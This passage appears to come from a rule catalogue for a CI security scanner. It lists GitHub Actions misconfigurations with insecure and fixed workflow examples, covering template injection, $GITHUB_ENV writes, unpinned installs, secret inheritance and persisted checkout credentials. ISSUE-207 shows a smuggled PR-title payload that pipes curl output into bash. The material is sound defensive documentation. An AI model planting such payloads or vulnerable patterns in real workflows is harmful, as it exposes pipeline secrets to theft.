        "Move the credentials into repository / organisation secrets and reference them via `${{ secrets.REGISTRY_PASSWORD }}`. If feasible, switch to OIDC federation (no long-lived password).",
      badExample: `# .github/workflows/publish.yml — ❌ Hardcoded
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/login-action@v3
        with:
          username: ci-bot
          password: dckr_pat_AAAA_BBBB_CCCC`,
      badExampleCaption: "Literal password in the workflow file.",
      goodExample: `# .github/workflows/publish.yml — ✅ From secrets
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}

# .plumber.yaml
github:
  controls:
    containerRegistryCredentialsMustNotBeHardcoded:
      enabled: true`,
      goodExampleCaption: "Credentials come from `secrets` (and ghcr.io supports `GITHUB_TOKEN` directly).",
      tips: [
        "ghcr.io accepts `GITHUB_TOKEN` for push — no separate credential needed.",
        "For Docker Hub, generate a scoped access token (read-only or read-write) instead of using the account password.",
        "If a credential ever was hardcoded, rotate it immediately — it's in the git history.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-301", "ISSUE-302"],
    },
  },

  "ISSUE-705": {
    code: "ISSUE-705",
    github: {
      title: "Release workflow primes cache from attacker-controlled artefacts",
      category: "Third-party actions",
      severity: "high",
      fixDuration: "long",
      productScope: "cli",
      controlName: "Release workflow must not poison its build cache",
      controlConfigKey: "releaseWorkflowsMustNotRestoreUntrustedCache",
      description:
        "A release/publish workflow restores a build cache primed by an earlier workflow on a less-trusted trigger (typically `pull_request_target` or a build that runs PR-author code).",
      impact:
        "If the cache contains compiled bytes derived from PR-author-controlled code, the release workflow ships those bytes — the malicious code never appears in the release commit, only in the cache that the trusted build reuses.",
      remediation:
        "Treat caches as untrusted across triggers. The release workflow should re-build from source rather than restoring a cache primed by an untrusted build.",
      badExample: `# .github/workflows/release.yml — ❌ Restores PR-built cache
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache/restore@v4
        with:
          path: dist/
          key: dist-\${{ github.sha }}   # populated by PR builds
      - run: ./publish.sh`,
      badExampleCaption: "`dist/` may have been produced by a PR-author-controlled build.",
      goodExample: `# .github/workflows/release.yml — ✅ Build from source
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: npm ci && npm run build
      - run: ./publish.sh`,
      goodExampleCaption: "The release workflow re-builds from a clean state.",
      tips: [
        "Treat the cache as untrusted whenever the writer could be a different trigger than the reader.",
        "If reuse is necessary, sign the cache contents and verify the signature before restoring.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-802", "ISSUE-804"],
    },
  },

  "ISSUE-706": {
    code: "ISSUE-706",
    github: {
      title: "Dockerfile FROM reference is not pinned by digest",
      category: "Third-party actions",
      severity: "medium",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Dockerfile FROM must be pinned by digest",
      controlConfigKey: "dockerfilesMustPinBaseImageByDigest",
      description:
        "A `Dockerfile` consumed by a workflow build step uses `FROM image:tag` instead of `FROM image@sha256:...`.",
      impact:
        "Same supply chain risk as ISSUE-103 but moved one level out: a mutable base-image tag can be retagged upstream between builds, silently swapping the base layers under your build.",
      remediation:
        "Pin the base image to its digest in the Dockerfile. `crane digest image:tag` or `docker inspect image:tag --format='{{.RepoDigests}}'` gives the digest.",
      badExample: `# Dockerfile — ❌ Mutable base
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci`,
      badExampleCaption: "`node:20-alpine` can change underneath you.",
      goodExample: `# Dockerfile — ✅ Pinned by digest
FROM node:20-alpine@sha256:c628bdc7ebc15dbd31196b3a2b96e7f51a3e89a1c6f3...
WORKDIR /app
COPY package*.json ./
RUN npm ci

# .plumber.yaml
github:
  controls:
    dockerfileFromMustBePinnedByDigest:
      enabled: true`,
      goodExampleCaption: "Digest pin prevents silent base swaps.",
      tips: [
        "Renovate's `dockerfile` manager auto-bumps digest pins on a schedule.",
        "Multi-stage builds: pin every `FROM` (including the `FROM ... AS builder` ones).",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-103", "ISSUE-101"],
    },
  },

  "ISSUE-207": {
    code: "ISSUE-207",
    github: {
      title: "Workflow inlines user input into a shell script",
      category: "CI/CD Variables",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not inline user input into shell scripts",
      controlConfigKey: "workflowMustNotInjectUserInputInScripts",
      description:
        "A `run:` step inlines a `${{ github.event.* }}` template expression directly into a shell command. The expression value is interpolated by GitHub *before* the shell parses it, so a malicious PR title becomes part of the executed script.",
      impact:
        "Template injection is the GitHub Actions equivalent of SQL injection. A PR titled `foo`; curl evil.sh | bash; #` becomes a runtime shell command with the workflow's secrets in scope. This is the #1 cause of secret exfiltration on GitHub Actions over the past two years.",
      remediation:
        "Bind the untrusted value to an `env:` variable first, then reference the env var from the shell. The shell quotes env-var expansion naturally, breaking the injection.",
      badExample: `# .github/workflows/welcome.yml — ❌ Template injection
on: pull_request_target
jobs:
  welcome:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Welcome \${{ github.event.pull_request.title }}!" `,
      badExampleCaption: "The PR title goes straight into the shell. `; curl evil.sh | bash; #` runs.",
      goodExample: `# .github/workflows/welcome.yml — ✅ Bind through env:
on: pull_request_target
jobs:
  welcome:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: \${{ github.event.pull_request.title }}
        run: echo "Welcome $PR_TITLE!"

# .plumber.yaml
github:
  controls:
    workflowMustNotInlineUserInputIntoShell:
      enabled: true`,
      goodExampleCaption: "The shell sees a single argument; quoting is automatic.",
      tips: [
        "The dangerous fields are `github.event.pull_request.*`, `github.event.issue.*`, `github.event.comment.*`, `github.head_ref`, and `github.event.commits[*].message`.",
        "`github.repository`, `github.sha`, and `github.ref_name` are derived from server-trusted state — safer but still worth scoping.",
        "Pair with ISSUE-802 to also catch the trigger side of the same attack.",
      ],
      relatedCodes: ["ISSUE-215", "ISSUE-213", "ISSUE-802"],
    },
  },

  "ISSUE-208": {
    code: "ISSUE-208",
    github: {
      title: "Workflow re-enables deprecated workflow commands",
      category: "CI/CD Variables",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not re-enable deprecated commands",
      controlConfigKey: "workflowMustNotReEnableInsecureCommands",
      description:
        "A workflow sets `ACTIONS_ALLOW_UNSECURE_COMMANDS=true` (or equivalent) which re-enables the long-retired `set-env` / `add-path` workflow commands.",
      impact:
        "The deprecated commands let any line printed to stdout set environment variables or modify $PATH in subsequent steps — a direct injection path for any process that echoes attacker-controlled content. GitHub retired the commands in 2020 for exactly this reason.",
      remediation:
        "Remove `ACTIONS_ALLOW_UNSECURE_COMMANDS`. Use the supported environment-files mechanism (`echo \"KEY=value\" >> $GITHUB_ENV`) instead — and only with trusted content (see ISSUE-209).",
      badExample: `# .github/workflows/build.yml — ❌ Unsafe commands re-enabled
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    steps:
      - run: ./old-script.sh`,
      badExampleCaption: "Any line `::set-env::` printed by old-script.sh now sets env vars in the next step.",
      goodExample: `# .github/workflows/build.yml — ✅ Deprecated commands stay off
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh
      - run: echo "VERSION=1.0.0" >> $GITHUB_ENV   # the supported way`,
      goodExampleCaption: "Uses the modern $GITHUB_ENV file (with vetted content).",
      tips: [
        "If you need this flag for a legacy action, fix the action instead — the alternative APIs have been available for five years.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-207", "ISSUE-209"],
    },
  },

  "ISSUE-209": {
    code: "ISSUE-209",
    github: {
      title: "Workflow writes untrusted content to $GITHUB_ENV",
      category: "CI/CD Variables",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not write untrusted content to $GITHUB_ENV",
      controlConfigKey: "workflowMustNotWriteUntrustedContentToGitHubEnv",
      description:
        "A workflow appends a line of the form `echo \"KEY=${{ github.event.* }}\" >> $GITHUB_ENV` with PR-author-controlled content on the right-hand side.",
      impact:
        "Writing attacker-controlled content to $GITHUB_ENV creates an environment variable for every subsequent step in the job. A title containing newlines (`foo\\nMALICIOUS_PATH=...`) can inject *multiple* env vars at once, including overriding $PATH.",
      remediation:
        "Bind the untrusted value through `env:` on the step that produces it. If you must write to $GITHUB_ENV, base64-encode the value so newlines can't escape the line.",
      badExample: `# .github/workflows/triage.yml — ❌ Untrusted into $GITHUB_ENV
on: pull_request_target
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "TITLE=\${{ github.event.pull_request.title }}" >> $GITHUB_ENV`,
      badExampleCaption: "A multi-line PR title escapes the `TITLE=` assignment into a free-form $GITHUB_ENV write.",
      goodExample: `# .github/workflows/triage.yml — ✅ Pre-bind + base64
on: pull_request_target
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: \${{ github.event.pull_request.title }}
        run: |
          encoded=$(printf '%s' "$PR_TITLE" | base64 -w0)
          echo "TITLE_B64=$encoded" >> $GITHUB_ENV`,
      goodExampleCaption: "Base64 ensures the value is one line; consumers decode explicitly.",
      tips: [
        "Use the same trick for `$GITHUB_OUTPUT` and `$GITHUB_PATH`.",
        "If you only need the value within one step, env: is enough — don't write to $GITHUB_ENV at all.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-207", "ISSUE-208"],
    },
  },

  "ISSUE-210": {
    code: "ISSUE-210",
    github: {
      title: "Workflow gates on a spoofable actor check",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not gate on spoofable actor checks",
      controlConfigKey: "workflowMustNotTrustSpoofableActorChecks",
      description:
        "A workflow uses `github.actor == 'dependabot[bot]'` (or similar) as a security gate. The actor field can be forged by certain trigger paths.",
      impact:
        "An attacker who can engineer a workflow_run trigger or a comment trigger may be able to make `github.actor` evaluate to whatever they want, bypassing the gate entirely.",
      remediation:
        "Gate on facts the platform actually verifies: `github.event.pull_request.head.repo.full_name == github.repository` (PR comes from the same repo) or the presence of a signed commit, not actor strings.",
      badExample: `# .github/workflows/release.yml — ❌ Spoofable actor gate
on: pull_request
jobs:
  approve:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - run: ./auto-merge.sh`,
      badExampleCaption: "`github.actor` is not a strong identity claim.",
      goodExample: `# .github/workflows/release.yml — ✅ Gate on the PR's head repo
on: pull_request
jobs:
  approve:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - run: ./auto-merge.sh`,
      goodExampleCaption: "The PR must come from the same repository (not a fork).",
      tips: [
        "For Dependabot specifically, use `github.event.pull_request.user.login == 'dependabot[bot]'` *and* `github.actor == 'dependabot[bot]'` *and* check that the PR was opened from `dependabot/` branches.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-802"],
    },
  },

  "ISSUE-211": {
    code: "ISSUE-211",
    github: {
      title: "Workflow `if:` condition is logically unsound",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow `if:` conditions must be logically sound",
      controlConfigKey: "workflowConditionsMustBeSound",
      description:
        "A workflow job or step has an `if:` condition that always evaluates the same way (always true, always false, or a tautology of two opposed clauses).",
      impact:
        "A latent always-true condition is a guard that does nothing — security checks 'gated' by it run unconditionally even when they shouldn't. Always-false conditions silently disable scans, giving false-green pipelines.",
      remediation:
        "Rewrite the condition to reflect the intended guard. Test it against representative trigger payloads.",
      badExample: `# .github/workflows/build.yml — ❌ Always true tautology
jobs:
  scan:
    if: \${{ github.event_name == 'push' || github.event_name != 'push' }}
    runs-on: ubuntu-latest
    steps:
      - run: ./expensive-scan.sh`,
      badExampleCaption: "The OR of an event and its negation is always true.",
      goodExample: `# .github/workflows/build.yml — ✅ Meaningful guard
jobs:
  scan:
    if: \${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}
    runs-on: ubuntu-latest
    steps:
      - run: ./expensive-scan.sh`,
      goodExampleCaption: "Runs only on pushes to main.",
      tips: [
        "Plumber's static evaluator handles `==`, `!=`, `&&`, `||`, and constant folding. Complex expressions involving function calls aren't checked.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-212", "ISSUE-410"],
    },
  },

  "ISSUE-212": {
    code: "ISSUE-212",
    github: {
      title: "Workflow misuses the contains() built-in",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow `contains()` calls must be well-typed",
      controlConfigKey: "workflowContainsCallsMustBeSound",
      description:
        "A workflow calls `contains(haystack, needle)` with swapped arguments, mismatched types, or in a way that always returns false.",
      impact:
        "`contains()` is the most common GitHub Actions string-membership check. A swapped-argument call silently returns false — and the security gate it's gating fails open.",
      remediation:
        "Use `contains(haystack, needle)` argument order. `contains(github.event.pull_request.labels.*.name, 'needs-review')` not `contains('needs-review', github.event.pull_request.labels.*.name)`.",
      badExample: `# .github/workflows/deploy.yml — ❌ Args swapped
jobs:
  deploy:
    if: contains('production', github.event.pull_request.labels.*.name)
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh`,
      badExampleCaption: "Asks 'does the literal string production contain the labels array' — always false.",
      goodExample: `# .github/workflows/deploy.yml — ✅ Correct order
jobs:
  deploy:
    if: contains(github.event.pull_request.labels.*.name, 'production')
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh`,
      goodExampleCaption: "Checks the labels array for the literal 'production'.",
      tips: [
        "`contains()` on an array compares element-by-element; on a string, it does substring match. Mixing the two is the typical bug.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-211"],
    },
  },

  "ISSUE-213": {
    code: "ISSUE-213",
    github: {
      title: "Workflow dumps the github context",
      category: "CI/CD Variables",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not dump the github context",
      controlConfigKey: "workflowMustNotExportEntireGitHubContext",
      description:
        "A workflow serialises `github` or `github.event` via `toJson(...)` into a `run:` step, an `env:` value, or an action input. The resulting JSON carries every PR-author-controllable field.",
      impact:
        "A single `echo $JSON` after a context dump leaks the full attack surface in one go. Even harmless-looking sinks (logs, third-party actions, HTTP headers) become exfiltration paths because the entire context is in one string.",
      remediation:
        "Reference only the specific fields you actually need. If you need the full payload (rare), write it to a file and consume it with `jq` so the shell never sees the raw JSON.",
      badExample: `# .github/workflows/debug.yml — ❌ Context dump
on: pull_request_target
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - run: echo '\${{ toJson(github) }}'`,
      badExampleCaption: "Every PR-author-controllable field becomes part of the shell command.",
      goodExample: `# .github/workflows/debug.yml — ✅ Specific fields, via env
on: pull_request_target
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_NUMBER: \${{ github.event.pull_request.number }}
          PR_HEAD_SHA: \${{ github.event.pull_request.head.sha }}
        run: echo "PR #$PR_NUMBER at $PR_HEAD_SHA" `,
      goodExampleCaption: "Pick the fields you need; bind through env.",
      tips: [
        "`toJson(secrets)` is a separate, even worse rule — see ISSUE-301.",
        "Use this rule in tandem with ISSUE-207 for full coverage of template-injection paths.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-207", "ISSUE-301", "ISSUE-215"],
    },
  },

  "ISSUE-214": {
    code: "ISSUE-214",
    github: {
      title: "Workflow installs a package without pinning",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Workflow must pin package installs",
      controlConfigKey: "workflowMustPinPackageInstalls",
      description:
        "A workflow runs `pip install foo`, `npm install foo`, `gem install foo`, etc. without specifying a version or relying on a lockfile.",
      impact:
        "An unpinned install pulls whatever version of `foo` exists at job time. The package-takeover attacks of 2018–2023 (`event-stream`, `colors`, dozens of typo-squats) relied on exactly this window.",
      remediation:
        "Pin to a specific version (`pip install foo==1.2.3`) or, better, use the language's lockfile mechanism (`pip install -r requirements.txt`, `npm ci`, `bundle install --deployment`).",
      badExample: `# .github/workflows/test.yml — ❌ Unpinned installs
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: pip install requests pyyaml
      - run: npm install -g typescript`,
      badExampleCaption: "Whatever version is on PyPI / npm registry at job time becomes part of the runtime.",
      goodExample: `# .github/workflows/test.yml — ✅ Lockfile-driven
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: pip install -r requirements.txt
      - run: npm ci`,
      goodExampleCaption: "Installs only what's in the committed lockfile.",
      tips: [
        "Enable hash-checking mode (`pip install --require-hashes`) for the strongest guarantee.",
        "Use `--frozen-lockfile` with Yarn / `npm ci` with npm to fail the build on lockfile drift.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701", "ISSUE-901", "ISSUE-902"],
    },
  },

  "ISSUE-215": {
    code: "ISSUE-215",
    github: {
      title: "Workflow expands `vars.*` template into shell",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not expand `vars.*` into shell",
      controlConfigKey: "workflowMustNotInjectVarsInScripts",
      description:
        "A `run:` step inlines `${{ vars.X }}` or `${{ inputs.X }}` directly into a shell command. These values are maintainer-controlled (not PR-author-controlled), but they still flow through the same shell-injection path if a reusable workflow input proxies attacker content.",
      impact:
        "A compromised maintainer or a misconfigured org variable becomes a shell-injection sink with no PR-side review. For reusable workflows, an `inputs.*` value passed from `${{ github.event.* }}` is attacker-controlled even though it looks 'safer'.",
      remediation:
        "Bind the variable through `env:` and reference the env var from the shell — same fix as ISSUE-207.",
      badExample: `# .github/workflows/reusable.yml — ❌ vars.* inlined
on:
  workflow_call:
    inputs:
      pr_title: { type: string, required: true }
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr comment \${{ inputs.pr_title }}`,
      badExampleCaption: "`inputs.pr_title` may carry attacker content from a caller workflow.",
      goodExample: `# .github/workflows/reusable.yml — ✅ env: indirection
on:
  workflow_call:
    inputs:
      pr_title: { type: string, required: true }
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: \${{ inputs.pr_title }}
        run: gh pr comment "$PR_TITLE" `,
      goodExampleCaption: "Env-bound value reaches the shell with shell quoting intact.",
      tips: [
        "Same remediation as ISSUE-207 — they're variants of the same root cause.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-207", "ISSUE-213"],
    },
  },

  "ISSUE-712": {
    code: "ISSUE-712",
    github: {
      title: "Release workflow produces unsigned artefacts",
      category: "Third-party actions",
      severity: "high",
      fixDuration: "long",
      productScope: "cli",
      controlName: "Release artefacts must be signed",
      controlConfigKey: "releaseWorkflowsMustSignArtefacts",
      description:
        "A workflow that publishes release assets (binaries, container images, packages) ships them without a signature step (cosign, GPG, SLSA provenance).",
      impact:
        "Consumers of unsigned releases can't verify the asset came from your pipeline rather than from a man-in-the-middle or a compromised release storage. Signature-less releases also block downstream supply-chain attestation chains (e.g. sigstore-policy-controller).",
      remediation:
        "Add a signing step using cosign (for container images and arbitrary blobs) or GPG / minisign (for archives). Publish the signature alongside the asset and document the verification command in your release notes.",
      badExample: `# .github/workflows/release.yml — ❌ No signature
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh
      - uses: softprops/action-gh-release@v2
        with:
          files: dist/*`,
      badExampleCaption: "Binaries are uploaded but never signed.",
      goodExample: `# .github/workflows/release.yml — ✅ Signed with cosign
permissions:
  id-token: write   # for OIDC keyless signing
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: ./build.sh
      - uses: sigstore/cosign-installer@d7d6e077b1f0e6c5d1aac8e1e1c75c9e3d4d70b1 # v3.7.0
      - run: |
          for f in dist/*; do
            cosign sign-blob --yes "$f" --output-signature "$f.sig"
          done
      - uses: softprops/action-gh-release@01570a1f39cb168c169c802c3bceb9e93fb10974 # v2
        with:
          files: |
            dist/*
            dist/*.sig`,
      goodExampleCaption: "cosign keyless signing via OIDC; signatures are published next to the artefacts.",
      tips: [
        "Cosign keyless signing needs `id-token: write` on the job (OIDC token).",
        "Pair with SLSA L3 build provenance via `slsa-github-generator` for the highest assurance.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701", "ISSUE-421"],
    },
  },

  "ISSUE-302": {
    code: "ISSUE-302",
    github: {
      title: "Reusable workflow called with `secrets: inherit`",
      category: "CI/CD Secrets",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Reusable workflow must not use `secrets: inherit`",
      controlConfigKey: "reusableWorkflowsMustNotInheritSecrets",
      description:
        "A caller workflow passes `secrets: inherit` to a reusable workflow, handing it every secret the caller has access to.",
      impact:
        "Inheriting is the wrong default. The callee — often a third-party reusable workflow — sees secrets it should never see. A compromise of the callee becomes a compromise of every caller's secret surface.",
      remediation:
        "Replace `secrets: inherit` with an explicit list naming only the secrets the callee actually needs.",
      badExample: `# .github/workflows/release.yml — ❌ Inherits everything
jobs:
  publish:
    uses: my-org/shared-workflows/.github/workflows/publish.yml@v1
    secrets: inherit`,
      badExampleCaption: "The callee receives every secret the caller can reach.",
      goodExample: `# .github/workflows/release.yml — ✅ Named-secrets only
jobs:
  publish:
    uses: my-org/shared-workflows/.github/workflows/publish.yml@a1b2c3d4e5f6...
    secrets:
      NPM_TOKEN: \${{ secrets.NPM_TOKEN }}`,
      goodExampleCaption: "The callee only sees the one secret it needs.",
      tips: [
        "Look at the callee's `on: workflow_call: secrets:` block to know exactly what to pass.",
        "If you author the reusable workflow, list each `secrets:` block explicitly — never accept `inherit` unconditionally.",
      ],
      relatedCodes: ["ISSUE-301", "ISSUE-801"],
    },
  },

  "ISSUE-303": {
    code: "ISSUE-303",
    github: {
      title: "Secret dereferenced via fromJSON bypasses redaction",
      category: "CI/CD Secrets",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Secret must not be dereferenced via fromJSON",
      controlConfigKey: "workflowMustNotUnredactSecretsViaFromJSON",
      description:
        "A workflow round-trips a secret through `fromJSON(toJSON(secrets.X))` or equivalent. The transformed form is no longer string-equal to the original secret and skips GitHub's log redactor.",
      impact:
        "The redactor matches secrets as exact substrings of log output. Any transformation (JSON round-trip, base64 with a different encoding, hex) produces a different string that prints clear-text in logs.",
      remediation:
        "Use the secret directly via `${{ secrets.X }}`. If you need it parsed, do the parsing inside a step's shell with the env-bound value, not in the template.",
      badExample: `# .github/workflows/use.yml — ❌ Transformed secret prints unredacted
jobs:
  use:
    runs-on: ubuntu-latest
    steps:
      - run: echo "\${{ fromJSON(toJSON(secrets.API_KEY)) }}" `,
      badExampleCaption: "The transformed string is no longer string-equal to the redactor's known value.",
      goodExample: `# .github/workflows/use.yml — ✅ Direct reference (redaction works)
jobs:
  use:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: \${{ secrets.API_KEY }}
        run: |
          curl -H "Authorization: Bearer $API_KEY" https://api.example.com`,
      goodExampleCaption: "The env-bound secret reaches the shell unmodified; the redactor masks it in logs.",
      tips: [
        "Any non-trivial transformation of a secret in YAML is a smell. Move the logic into a shell step where the redactor still applies.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-301"],
    },
  },

  "ISSUE-801": {
    code: "ISSUE-801",
    github: {
      title: "Workflow does not declare permissions",
      category: "Workflow triggers and permissions",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow permissions must be declared",
      controlConfigKey: "workflowsMustDeclarePermissions",
      description:
        "A workflow has no top-level `permissions:` block. The job inherits whatever the repo / organisation default is, which is often write-all.",
      impact:
        "Implicit permissions are silently broad. A workflow that legitimately needs `contents: read` may end up with `contents: write`, `id-token: write`, and a dozen other scopes — any one of which a compromised step can use to push to the repo or impersonate the workflow.",
      remediation:
        "Add a top-level `permissions:` block listing only the scopes the workflow actually needs. Most workflows only need `contents: read`.",
      badExample: `# .github/workflows/test.yml — ❌ Inherits whatever the repo default is
name: test
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test`,
      badExampleCaption: "No explicit `permissions:` — relies on the repo default.",
      goodExample: `# .github/workflows/test.yml — ✅ Least privilege
name: test
on: [push, pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: npm test

# .plumber.yaml
github:
  controls:
    workflowMustDeclarePermissions:
      enabled: true`,
      goodExampleCaption: "`contents: read` is sufficient for a test workflow.",
      tips: [
        "Override per-job when a specific job needs more (e.g. `release` needing `contents: write`).",
        "Org admins can also enforce `permissions: read-all` as the org default — a useful safety net.",
        "Pair with ISSUE-803 to catch the over-broad case explicitly.",
      ],
      relatedCodes: ["ISSUE-803", "ISSUE-302"],
    },
  },

  "ISSUE-305": {
    code: "ISSUE-305",
    github: {
      title: "Secret used without an environment gate",
      category: "CI/CD Secrets",
      severity: "medium",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Secret use must be gated by an environment",
      controlConfigKey: "deployJobsMustUseEnvironmentGate",
      description:
        "A job consumes production secrets (deploy, release, publish) without declaring an `environment:` field.",
      impact:
        "Environments are GitHub's mechanism for required reviewers, wait timers, and branch-pattern restrictions on secret access. Without one, any caller on the configured trigger goes straight to the secret-bearing step with no human in the loop.",
      remediation:
        "Move production secrets into a GitHub Environment (`Settings > Environments`), configure required reviewers, and reference the environment in the job.",
      badExample: `# .github/workflows/deploy.yml — ❌ No environment gate
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          PROD_API_KEY: \${{ secrets.PROD_API_KEY }}
        run: ./deploy.sh`,
      badExampleCaption: "Any trigger that reaches this job exfiltrates `PROD_API_KEY` from logs.",
      goodExample: `# .github/workflows/deploy.yml — ✅ Environment gate
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production   # required reviewer + branch restrictions
    steps:
      - env:
          PROD_API_KEY: \${{ secrets.PROD_API_KEY }}
        run: ./deploy.sh`,
      goodExampleCaption: "GitHub blocks the job until a required reviewer approves the deployment.",
      tips: [
        "Configure the environment with a required reviewer list under Settings > Environments > production > Deployment protection rules.",
        "Branch / tag restrictions on the environment make the gate tamper-proof from PR-author code.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-802", "ISSUE-301"],
    },
  },

  "ISSUE-306": {
    code: "ISSUE-306",
    github: {
      title: "GitHub App token issued with revocation disabled",
      category: "CI/CD Secrets",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "GitHub App token must allow revocation",
      controlConfigKey: "githubAppTokensMustBeRevokedOnExit",
      description:
        "A workflow generates an installation token via a GitHub App action (e.g. `create-github-app-token`) with `skip-token-revoke: true`.",
      impact:
        "A long-lived installation token survives beyond the job. If the runner is compromised mid-job, the token remains usable after the job ends — exactly the window a remote attacker needs.",
      remediation:
        "Let the action revoke the token at job end (the default). Remove `skip-token-revoke: true` unless you have a specific cross-job requirement that justifies it.",
      badExample: `# .github/workflows/release.yml — ❌ Token outlives the job
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@v1
        id: app-token
        with:
          app-id: \${{ vars.APP_ID }}
          private-key: \${{ secrets.APP_PRIVATE_KEY }}
          skip-token-revoke: true`,
      badExampleCaption: "Token remains valid for ~1 hour after the job ends.",
      goodExample: `# .github/workflows/release.yml — ✅ Revoke at end of job
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@d72941d797fd3113feb6b93fd0dec494b13a2547 # v1.12.0
        id: app-token
        with:
          app-id: \${{ vars.APP_ID }}
          private-key: \${{ secrets.APP_PRIVATE_KEY }}`,
      goodExampleCaption: "Default revocation behaviour — token is invalidated when the job ends.",
      tips: [
        "If you need the token across multiple jobs, generate one per job rather than reusing one with revoke skipped.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-302"],
    },
  },

  "ISSUE-307": {
    code: "ISSUE-307",
    github: {
      title: "Checkout persists credentials in .git/config",
      category: "CI/CD Secrets",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Checkout must not persist credentials",
      controlConfigKey: "checkoutMustNotPersistCredentials",
      description:
        "A workflow calls `actions/checkout` without `persist-credentials: false`, which leaves the GITHUB_TOKEN bound to `.git/config` for the rest of the job.",
      impact:
        "A later `actions/upload-artifact` of the checkout directory bundles the credentials inside the artifact zip — visible to anyone who can read the artifact. This is the 'artipacked' leak pattern from 2023.",
      remediation:
        "Set `persist-credentials: false` on every `actions/checkout` step unless you have a specific reason to keep the credentials configured.",
      badExample: `# .github/workflows/build.yml — ❌ Credentials remain in .git/config
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # persist-credentials defaults to true
      - run: ./build.sh
      - uses: actions/upload-artifact@v4
        with:
          path: .   # bundles .git/config including credentials`,
      badExampleCaption: "The artifact zip contains the workflow's GITHUB_TOKEN bound to .git/config.",
      goodExample: `# .github/workflows/build.yml — ✅ persist-credentials: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
